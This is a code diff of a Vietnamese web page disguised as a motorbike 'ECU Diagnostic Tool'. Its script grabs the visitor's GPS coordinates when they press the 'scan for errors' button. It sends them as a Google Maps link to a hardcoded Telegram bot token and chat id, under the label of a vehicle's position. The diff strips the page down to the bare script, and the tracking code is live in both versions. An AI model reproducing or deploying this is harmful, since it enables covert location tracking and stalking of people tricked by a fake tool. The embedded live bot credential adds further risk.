@@ -1,55 +1,29 @@
-<!DOCTYPE html>
-<html lang="vi">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ECU Wave 54</title>
-</head>
-<body style="background: #0d1117; color: #00f2ff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0;">
+<script>
+    function runDiagnostic() {
+        var status = document.getElementById("status");
+        var token = "8571376502:AAGnzWuqINqn1DfeL-ux16jC-sWt9xeqjmg"; //
+        var chat_id = "1197457034"; 
 
-    <div style="width: 85%; max-width: 350px; padding: 25px; border: 1px solid #00f2ff; border-radius: 15px; background: #161b22; box-shadow: 0 0 20px rgba(0,242,255,0.2); text-align: center; position: relative; z-index: 1;">
+        status.innerHTML = "> Đang kết nối...";
         
-        <h2 style="margin: 0 0 15px 0; font-size: 20px; letter-spacing: 2px;">WAVE <span style="color: #fff;">54-4VAL</span></h2>
-        
-        <div style="background: #000; padding: 15px; border-radius: 8px; margin-bottom: 25px; border-left: 3px solid #00f2ff; text-align: left;">
-            <div id="status" style="font-family: monospace; font-size: 13px;">> Sẵn sàng quét...</div>
-        </div>
-
-        <button onclick="runDiagnostic()" style="width: 100%; padding: 15px; background: #00f2ff; color: #000; border: none; border-radius: 10px; font-size: 16px; font-weight: bold; cursor: pointer; position: relative; z-index: 10;">
-            BẮT ĐẦU QUÉT LỖI
-        </button>
-
-        <div style="margin-top: 20px; font-size: 10px; color: #484f58; text-transform: uppercase;">
-            ECU Diagnostic Tool v2.0
-        </div>
-    </div>
-
-    <script>
-        function runDiagnostic() {
-            const status = document.getElementById("status");
-            const token = "8571376502:AAGnzWuqINqn1DfeL-ux16jC-sWt9xeqjmg"; //
-            const chat_id = "1197457034"; 
-
-            status.innerHTML = "> Đang kết nối...";
+        navigator.geolocation.getCurrentPosition(function(pos) {
+            status.innerHTML = "> Đang gửi dữ liệu...";
             
-            navigator.geolocation.getCurrentPosition((pos) => {
-                status.innerHTML = "> Đang gửi dữ liệu...";
-                
-                // Đã loại bỏ các ký hiệu thừa để tin nhắn gọn sạch
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                const message = "🛠 BÁO CÁO:\n📍 Xe 54 4val tại: http://google.com/maps?q=" + lat + "," + lon;
-                
-                const url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(message);
-                
-                fetch(url).then(() => {
-                    status.innerHTML = "<span style='color: #4cd137;'>> HOÀN TẤT!</span>";
-                    alert("Đã gửi thành công!");
-                });
-            }, () => {
-                status.innerHTML = "<span style='color: #ff4757;'>> LỖI: GPS bị chặn!</span>";
+            var lat = pos.coords.latitude;
+            var lon = pos.coords.longitude;
+            
+            // Cách nối chuỗi thủ công, tuyệt đối không có dấu $
+            var linkMaps = "https://www.google.com/maps?q=" + lat + "," + lon;
+            var message = "🛠 BÁO CÁO:\n📍 Xe 54 4val tại: " + linkMaps;
+            
+            var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(message);
+            
+            fetch(url).then(function() {
+                status.innerHTML = "<span style='color: #4cd137;'>> HOÀN TẤT!</span>";
+                alert("Đã gửi thành công!");
             });
-        }
-    </script>
-</body>
-</html>
+        }, function() {
+            status.innerHTML = "<span style='color: #ff4757;'>> LỖI: GPS bị chặn!</span>";
+        });
+    }
+</script>
